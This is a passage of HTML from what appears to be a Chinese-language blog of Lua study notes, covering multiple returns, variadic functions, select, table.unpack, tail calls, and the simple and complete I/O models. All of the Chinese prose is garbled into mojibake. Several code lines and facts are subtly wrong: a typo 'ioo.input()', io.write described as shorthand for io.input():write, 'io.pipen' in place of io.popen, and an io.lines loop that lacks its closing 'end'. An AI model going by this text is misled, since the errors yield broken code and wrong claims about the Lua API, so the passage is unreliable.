class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> <span class="hljs-keyword">end</span><br><br>x,y = foo(), <span class="hljs-number">20</span>     <span class="hljs-comment">-- x=&quot;a&quot;, y=20</span><br></code></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªå‡½æ•°è°ƒç”¨æ˜¯å¦ä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„æœ€åä¸€ä¸ªå®å‚æ—¶, ç¬¬ä¸€ä¸ªå‡½æ•°çš„æ‰€æœ‰è¿”å›å€¼éƒ½ä¼šè¢«ä½œä¸ºå®å‚ä¼ ç»™ç¬¬äºŒä¸ªå‡½æ•°.</p><p>å°†å‡½æ•°è°ƒç”¨ç”¨ç”¨ä¸€å¯¹åœ†æ‹¬å·æ‹¬èµ·æ¥å¯ä»¥å¼ºåˆ¶å…¶åªè¿”å›ä¸€ä¸ªç»“æœ:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>((foo()))<br></code></pre></td></tr></table></figure><h2 id="6-2-å¯å˜é•¿å‚æ•°å‡½æ•°"><a href="#6-2-å¯å˜é•¿å‚æ•°å‡½æ•°" class="headerlink" title="6.2 å¯å˜é•¿å‚æ•°å‡½æ•°"></a>6.2 å¯å˜é•¿å‚æ•°å‡½æ•°</h2><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span></span><br>    <span class="hljs-keyword">local</span> s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>&#123;...&#125; <span class="hljs-keyword">do</span><br>        s = s + v<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> s<br><span class="hljs-keyword">end</span><br><br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">25</span>, <span class="hljs-number">12</span>))<br></code></pre></td></tr></table></figure><p><code>...</code> è¡¨ç¤ºè¯¥å‡½æ•°çš„å‚æ•°æ˜¯å¯å˜é•¿çš„.</p><p>å½“å‡½æ•°è¦è®¿é—®è¿™äº›å‚æ•°æ—¶ä»éœ€ç”¨åˆ° <code>...</code></p><p>è¡¨è¾¾å¼ <code>&#123;...&#125;</code> (è¢«ç§°ä¸ºå¯å˜é•¿å‚æ•°è¡¨è¾¾å¼ vararg expression) çš„ç»“æœæ˜¯ä¸€ä¸ªç”±æ‰€æœ‰å¯å˜é•¿å‚æ•°ç»„æˆçš„åˆ—è¡¨.</p><p>å¯ç”¨å˜é•¿å‚æ•°æ¥æ¨¡æ‹Ÿ Lua ä¸­æ™®é€šçš„å‚æ•°ä¼ é€’æœºåˆ¶:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span><span class="hljs-params">(...)</span></span><br>    <span class="hljs-keyword">local</span> a, b, c = ...<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>æ ¼å¼åŒ–è¾“å‡ºçš„å‡½æ•° <code>string.format</code>. è¾“å‡ºæ–‡æœ¬å‡½æ•° <code>io.write</code></p><p>å…·æœ‰å¯å˜é•¿å‚æ•°çš„å‡½æ•°ä¹Ÿå¯ä»¥å…·æœ‰ä»»æ„æ•°é‡çš„å›ºå®šå‚æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fwrite</span><span class="hljs-params">(fmt, ...)</span></span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">io</span>.<span class="hljs-built_in">write</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(fmt, ...))<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>table.pack</code> å‡½æ•°, ä¿å­˜æ‰€æœ‰å‚æ•°, ç„¶åå°†å…¶æ”¾åœ¨ä¸€ä¸ªè¡¨ä¸­è¿”å›, è¿™ä¸ªè¡¨ä¸­è¿˜æœ‰ä¸€ä¸ªä¿å­˜äº†å‚æ•°ä¸ªæ•°çš„é¢å¤–å­—æ®µ â€œnâ€.</p><p>åˆ¤æ–­å¯å˜é•¿å‚æ•°ä¸­æ˜¯å¦åŒ…å«æ— æ•ˆçš„ <code>nil</code>:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nonils</span><span class="hljs-params">(...)</span></span><br>    <span class="hljs-keyword">local</span> <span class="hljs-built_in">arg</span> = <span class="hljs-built_in">table</span>.pack(...)<br>    <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-built_in">arg</span>.n <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">arg</span>[i] == <span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-select-å‡½æ•°éå†"><a href="#ä½¿ç”¨-select-å‡½æ•°éå†" class="headerlink" title="ä½¿ç”¨ select å‡½æ•°éå†"></a>ä½¿ç”¨ select å‡½æ•°éå†</h3><p>å‡½æ•° <code>select</code> æ€»æ˜¯å…·æœ‰ä¸€ä¸ªå›ºå®šçš„å‚æ•° <code>selector</code>, ä»¥åŠæ•°é‡å¯å˜çš„å‚æ•°, å¦‚æœ <code>selector</code> æ˜¯æ•°å€¼ n, é‚£ä¹ˆå‡½æ•° select åˆ™è¿”å›ç¬¬ n ä¸ªå‚æ•°åçš„æ‰€æœ‰å‚æ•°, å¦åˆ™, <code>selector</code> åº”è¯¥æ˜¯å­—ç¬¦ä¸² <code>#</code>, ä»¥ä¾¿å‡½æ•° <code>select</code> è¿”å›é¢å¤–å‚æ•°çš„æ€»æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">select</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>))     <span class="hljs-comment">--&gt; a b c</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">select</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>))     <span class="hljs-comment">--&gt; b c</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">select</span>(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>))     <span class="hljs-comment">--&gt; c</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">select</span>(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>))     <span class="hljs-comment">--&gt; 3</span><br></code></pre></td></tr></table></figure><p>éå†å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span></span><br>    <span class="hljs-keyword">local</span> s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-built_in">select</span>(<span class="hljs-string">&quot;#&quot;</span>, ...) <span class="hljs-keyword">do</span><br>        s = s + <span class="hljs-built_in">select</span>(i, ...)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> s<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="6-3-å‡½æ•°-table-unpack"><a href="#6-3-å‡½æ•°-table-unpack" class="headerlink" title="6.3 å‡½æ•° table.unpack"></a>6.3 å‡½æ•° table.unpack</h2><p>å…¶å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„, è¿”å›å€¼ä¸ºæ•°ç»„å†…çš„æ‰€æœ‰å…ƒç´ .</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">table</span>.<span class="hljs-built_in">unpack</span>&#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;)<br>a,b = <span class="hljs-built_in">table</span>.<span class="hljs-built_in">unpack</span>&#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡æ•°ç»„ a ä¼ å…¥å¯å˜çš„å‚æ•°æ¥è°ƒç”¨å‡½æ•° f:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">f(<span class="hljs-built_in">table</span>.<span class="hljs-built_in">unpack</span>(a))<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªç­‰ä»·å½¢å¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;ll&quot;</span>))<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">f = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span><br>a = &#123;<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;ll&quot;</span>&#125;<br><br><span class="hljs-built_in">print</span>(f(<span class="hljs-built_in">table</span>.<span class="hljs-built_in">unpack</span>(a)))<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ˜¾ç¤ºåœ°é™åˆ¶è¿”å›å…ƒç´ çš„èŒƒå›´</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">table</span>.<span class="hljs-built_in">unpack</span>(&#123;<span class="hljs-string">&quot;Sun&quot;</span>, <span class="hljs-string">&quot;Mon&quot;</span>, <span class="hljs-string">&quot;Tue&quot;</span>, <span class="hljs-string">&quot;Wed&quot;</span>&#125;, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><h2 id="6-4-æ­£ç¡®çš„å°¾è°ƒç”¨"><a href="#6-4-æ­£ç¡®çš„å°¾è°ƒç”¨" class="headerlink" title="6.4 æ­£ç¡®çš„å°¾è°ƒç”¨"></a>6.4 æ­£ç¡®çš„å°¾è°ƒç”¨</h2><p>å½“ä¸€ä¸ªå‡½æ•°çš„æœ€åä¸€ä¸ªåŠ¨ä½œæ˜¯è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°è€Œæ²¡æœ‰è¿›è¡Œå…¶ä»–å·¥ä½œæ—¶, å°±å½¢æˆäº† <mark>å°¾è°ƒç”¨ (tail call)</mark> </p><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">(x)</span></span><br>    x = x + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> g(x) <br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å½“ g è¿”å›æ—¶, ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ä¼šç›´æ¥è¿”å›åˆ°è°ƒç”¨ f çš„ä½ç½®. ä¸ä¼šå†è°ƒç”¨æ ˆä¸­ä¿å­˜æœ‰å…³è°ƒç”¨å‡½æ•°çš„ä»»ä½•ä¿¡æ¯.</p><p>åœ¨è¿›è¡Œå°¾è°ƒç”¨æ—¶ä¸ä½¿ç”¨ä»»ä½•é¢å¤–çš„æ ˆç©ºé—´ï¼Œç§°è¿™ç§å®ç°ä¸º<mark>å°¾è°ƒç”¨æ¶ˆé™¤ (tail-call elimination)</mark></p><p>ç”±äºå°¾è°ƒç”¨ä¸ä¼šä½¿ç”¨æ ˆç©ºé—´, æ‰€ä»¥ä¸€ä¸ªç¨‹åºä¸­èƒ½å¤ŸåµŒå¥—çš„å°¾è°ƒç”¨çš„æ•°é‡æ˜¯æ— é™çš„. (ä¸ä¼šå‘ç”Ÿæ ˆæº¢å‡º)</p><h1 id="7-è¾“å…¥è¾“å‡º"><a href="#7-è¾“å…¥è¾“å‡º" class="headerlink" title="7 è¾“å…¥è¾“å‡º"></a>7 è¾“å…¥è¾“å‡º</h1><p>Lua åªæä¾›äº† ISO C è¯­è¨€æ ‡å‡†æ”¯æŒçš„åŠŸèƒ½, å³åŸºæœ¬çš„æ–‡ä»¶æ“ä½œç­‰.</p><h2 id="7-1-ç®€å•-I-x2F-O-æ¨¡å‹"><a href="#7-1-ç®€å•-I-x2F-O-æ¨¡å‹" class="headerlink" title="7.1 ç®€å• I&#x2F;O æ¨¡å‹"></a>7.1 ç®€å• I&#x2F;O æ¨¡å‹</h2><p>I&#x2F;O æ“ä½œé€šè¿‡:</p><ul><li>å½“å‰è¾“å…¥æµ (current input stream), åˆå§‹åŒ–ä¸ºæ ‡å‡†è¾“å…¥ stdin</li><li>å½“å‰è¾“å‡ºæµ (current output stream), åˆå§‹åŒ–ä¸ºæ ‡å‡†è¾“å‡º stdout</li></ul><p>å®ç°.</p><h3 id="å‡½æ•°-io-input-å’Œ-io-output"><a href="#å‡½æ•°-io-input-å’Œ-io-output" class="headerlink" title="å‡½æ•° io.input å’Œ io.output"></a>å‡½æ•° io.input å’Œ io.output</h3><p>å‡½æ•° <code>io.input</code> å’Œå‡½æ•° <code>io.output</code> å¯ä»¥ç”¨äºæ”¹å˜å½“å‰çš„è¾“å…¥è¾“å‡ºæµ.</p><p>å¦‚: <code>io.input(filename)</code> ä¼šä»¥åªè¯»æ¨¡å¼æ‰“å¼€æŒ‡å®šæ–‡ä»¶, å¹¶å°†æ–‡ä»¶è®¾ç½®ä¸ºå½“å‰è¾“å…¥æµ.</p><h3 id="å‡½æ•°-io-write-å’Œ-io-read"><a href="#å‡½æ•°-io-write-å’Œ-io-read" class="headerlink" title="å‡½æ•° io.write å’Œ io.read"></a>å‡½æ•° io.write å’Œ io.read</h3><p><code>io.write</code> è¯»å–ä»»æ„æ•°é‡çš„å­—ç¬¦ä¸² (æˆ–è€…æ•°å­—) å¹¶å°†å…¶å†™å…¥å½“å‰è¾“å‡ºæµ.</p><p><mark>ä½œä¸ºåŸåˆ™</mark>, åº”è¯¥åªåœ¨ â€œç”¨åå³å¼ƒâ€ çš„ä»£ç æˆ–è°ƒè¯•ä»£ç ä¸­ä½¿ç”¨å‡½æ•° <code>print</code>, å½“éœ€è¦å®Œå…¨æ§åˆ¶è¾“å‡ºæ—¶, åº”è¯¥ä½¿ç”¨å‡½æ•° <code>io.write</code>.</p><p>å‡½æ•° <code>io.write</code> å…è®¸å¯¹è¾“å‡ºè¿›è¡Œé‡å®šå‘. å‡½æ•° <code>print</code> åªèƒ½ä½¿ç”¨æ ‡å‡†è¾“å‡º, å…¶å¯ä»¥è‡ªåŠ¨ä¸ºå…¶å‚æ•°è°ƒç”¨ <code>tostring</code>.</p><p><code>io.read</code> å¯ä»¥ä»å½“å‰è¾“å…¥æµä¸­è¯»å–å­—ç¬¦ä¸², å…¶å‚æ•°æœ‰:</p><p><img src="/../img/lua_args_of_io_read.png"></p><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> count = <span class="hljs-number">1</span>, <span class="hljs-built_in">math</span>.<span class="hljs-built_in">huge</span> <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">local</span> line = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;L&quot;</span>)<br>    <span class="hljs-keyword">if</span> line == <span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">break</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-built_in">io</span>.<span class="hljs-built_in">write</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%6d  &quot;</span>, count), line)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>io.lines</code> è¿­ä»£å™¨, é€è¡Œè¿­ä»£ä¸€ä¸ªæ–‡ä»¶:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> count = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">io</span>.<span class="hljs-built_in">lines</span>() <span class="hljs-keyword">do</span><br>    count = count + <span class="hljs-number">1</span><br>    <span class="hljs-built_in">io</span>.<span class="hljs-built_in">write</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%6d  &quot;</span>, count), line, <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>io.read(0)</code> æ˜¯ä¸€ä¸ªç‰¹ä¾‹, å®ƒå¸¸ç”¨äºæµ‹è¯•æ˜¯å¦åˆ°è¾¾äº†æ–‡ä»¶æœ«å°¾, å¦‚æœä»ç„¶æœ‰æ•°æ®å¯ä¾›è¯»å–, å®ƒä¼šè¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸², å¦åˆ™, åˆ™è¿”å› nil.</p><p>è°ƒç”¨ <code>read</code> æ—¶å¯ä»¥æŒ‡å®šå¤šä¸ªé€‰é¡¹, å‡½æ•°ä¼šæ ¹æ®æ¯ä¸ªå‚æ•°è¿”å›ç›¸åº”çš„ç»“æœ, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">local</span> n1, n2, n3 = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> n1 <span class="hljs-keyword">then</span> <span class="hljs-keyword">break</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">math</span>.<span class="hljs-built_in">max</span>(n1, n2, n3))<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="7-2-å®Œæ•´-I-x2F-O-æ¨¡å‹"><a href="#7-2-å®Œæ•´-I-x2F-O-æ¨¡å‹" class="headerlink" title="7.2 å®Œæ•´ I&#x2F;O æ¨¡å‹"></a>7.2 å®Œæ•´ I&#x2F;O æ¨¡å‹</h2><h3 id="io-open"><a href="#io-open" class="headerlink" title="io.open"></a>io.open</h3><p>ä¸¤ä¸ªå‚æ•°:</p><ul><li>å¾…æ‰“å¼€çš„æ–‡ä»¶å</li><li>æ¨¡å¼, åŒ…æ‹¬: åªè¯»çš„ <code>r</code>, åªå†™çš„ <code>w</code>, è¿½åŠ çš„ <code>a</code>, æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶çš„ <code>b</code></li></ul><p><mark>æ£€æŸ¥é”™è¯¯</mark>, ä½¿ç”¨ <code>assert</code> å‡½æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> f = <span class="hljs-built_in">assert</span>(<span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(filename, mode))<br></code></pre></td></tr></table></figure><p>é”™è¯¯ä¿¡æ¯ä¼šä½œä¸ºå‡½æ•° <code>assert</code> çš„ç¬¬äºŒä¸ªå‚æ•°è¢«ä¼ å…¥, ä¹‹åå‡½æ•° <code>assert</code> ä¼šå°†é”™è¯¯ä¿¡æ¯å±•ç¤ºå‡ºæ¥.</p><p>åœ¨æ‰“å¼€æ–‡ä»¶å, å¯ä»¥ä½¿ç”¨æ–¹æ³• <code>read</code> å’Œ <code>write</code> ä»æµä¸­è¯»å–å’Œå‘æµä¸­å†™å…¥, éœ€è¦ <mark>ä½¿ç”¨å†’å·è¿ç®—ç¬¦</mark>  å°†å®ƒä»¬å½“ä½œæµå¯¹è±¡çš„æ–¹æ³•æ¥è°ƒç”¨:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> f = <span class="hljs-built_in">assert</span>(<span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>))<br><span class="hljs-keyword">local</span> t = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>f:<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p><mark>ä¸‰ä¸ªé¢„å®šä¹‰çš„ C è¯­è¨€æµçš„å¥æŸ„</mark>:</p><ul><li><code>io.stdin</code></li><li><code>io.stdout</code></li><li><code>io.stderr</code></li></ul><p>æ··ç”¨ I&#x2F;O æ¨¡å‹:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> temp = ioo.<span class="hljs-built_in">input</span>()<br><span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;newinput&quot;</span>)<br><span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>():<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>(temp)<br></code></pre></td></tr></table></figure><p><mark>æ³¨æ„</mark>:</p><ul><li><code>io.read(args)</code> å®é™…ä¸Šæ˜¯ <code>io.input():read(args)</code> çš„ç®€å†™</li><li><code>io.write(args)</code> å®é™…ä¸Šæ˜¯ <code>io.input():write(args)</code> çš„ç®€å†™</li></ul><h2 id="7-3-å…¶ä»–æ–‡ä»¶æ“ä½œ"><a href="#7-3-å…¶ä»–æ–‡ä»¶æ“ä½œ" class="headerlink" title="7.3 å…¶ä»–æ–‡ä»¶æ“ä½œ"></a>7.3 å…¶ä»–æ–‡ä»¶æ“ä½œ</h2><h3 id="io-tmpfile"><a href="#io-tmpfile" class="headerlink" title="io.tmpfile"></a>io.tmpfile</h3><p>è¿”å›ä¸€ä¸ªæ“ä½œä¸´æ—¶æ–‡ä»¶çš„å¥æŸ„, å…¶ä»¥è¯»&#x2F;å†™æ¨¡å¼æ‰“å¼€.</p><h3 id="flush"><a href="#flush" class="headerlink" title="flush"></a>flush</h3><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><h3 id="seek"><a href="#seek" class="headerlink" title="seek"></a>seek</h3><h3 id="whence"><a href="#whence" class="headerlink" title="whence"></a>whence</h3><h3 id="os-rename"><a href="#os-rename" class="headerlink" title="os.rename"></a>os.rename</h3><h3 id="os-remove"><a href="#os-remove" class="headerlink" title="os.remove"></a>os.remove</h3><h2 id="7-4-å…¶ä»–ç³»ç»Ÿè°ƒç”¨"><a href="#7-4-å…¶ä»–ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="7.4 å…¶ä»–ç³»ç»Ÿè°ƒç”¨"></a>7.4 å…¶ä»–ç³»ç»Ÿè°ƒç”¨</h2><h3 id="os-exit"><a href="#os-exit" class="headerlink" title="os.exit"></a>os.exit</h3><h3 id="os-getenv"><a href="#os-getenv" class="headerlink" title="os.getenv"></a>os.getenv</h3><h3 id="7-4-1-è¿è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#7-4-1-è¿è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="7.4.1 è¿è¡Œç³»ç»Ÿå‘½ä»¤"></a>7.4.1 è¿è¡Œç³»ç»Ÿå‘½ä»¤</h3><h4 id="os-execute"><a href="#os-execute" class="headerlink" title="os.execute"></a>os.execute</h4><p>ç­‰ä»·äº C è¯­è¨€ä¸­çš„å‡½æ•° system.</p><h4 id="io-pipen"><a href="#io-pipen" class="headerlink" title="io.pipen"></a>io.pipen</h4><h1 id="8-è¡¥å……çŸ¥è¯†"><a href="#8-è¡¥å……çŸ¥è¯†" class="headerlink" title="8 è¡¥å……çŸ¥è¯†"></a>8 è¡¥å……çŸ¥è¯†</h1><h2 id="8-1-å±€éƒ¨å˜é‡å’Œä»£ç å—"><a href="#8-1-å±€éƒ¨å˜é‡å’Œä»£ç å—" class="headerlink" title="8.1 å±€éƒ¨å˜é‡å’Œä»£ç å—"></a>8.1 å±€éƒ¨å˜é‡å’Œä»£ç å—</h2><p>Lua è¯­è¨€ä¸­çš„å˜é‡åœ¨<mark>é»˜è®¤æƒ…å†µä¸‹æ˜¯å…¨å±€å˜é‡</mark>, æ‰€æœ‰çš„å±€éƒ¨å˜é‡åœ¨ä½¿ç”¨å‰å¿…é¡»å£°æ˜.</p><p>å±€éƒ¨å˜é‡çš„ç”Ÿæ•ˆèŒƒå›´ä»…é™äºå£°æ˜å®ƒçš„ä»£ç å—.</p><p>åœ¨ <mark>äº¤äº’æ¨¡å¼</mark> ä¸­, æ¯ä¸€è¡Œä»£ç å°±æ˜¯ä¸€ä¸ªä»£ç æ®µ. å¯ä»¥ç”¨ <code>do-end</code> è¯­å¥æ˜¾å¼å£°æ˜æ•´ä¸ªä»£ç å—:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> x1, x2<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">local</span> a2 = <span class="hljs-number">2</span>*a<br>    <span class="hljs-keyword">local</span> d = (b^<span class="hljs-number">2</span> - <span class="hljs-number">4</span>*a*c)^(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>)<br>    x1 = (-b + d)/a2<br>    x2 = (-b - d)/a2<br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(x1, x2)<br></code></pre></td></tr></table></figure><p><mark>å°½å¯èƒ½ä½¿ç”¨å±€éƒ¨å˜é‡</mark>æ˜¯ä¸€ç§è‰¯å¥½çš„ç¼–ç¨‹é£æ ¼.</p><p>Lua è¯­è¨€çš„å‘è¡Œç‰ˆä¸­æœ‰ä¸€ä¸ª<mark>ç”¨äºå…¨å±€å˜é‡æ£€æŸ¥çš„æ¨¡å—</mark> <code>strict.lua</code>, å¦‚æœè¯•å›¾åœ¨ä¸€ä¸ªå‡½æ•°ä¸­å¯¹ä¸å­˜åœ¨çš„å…¨å±€å˜é‡èµ‹å€¼æˆ–è€…ä½¿ç”¨ä¸å­˜åœ¨çš„å…¨å±€å˜é‡, å°†ä¼šæŠ›å‡ºå¼‚å¸¸.</p><h2 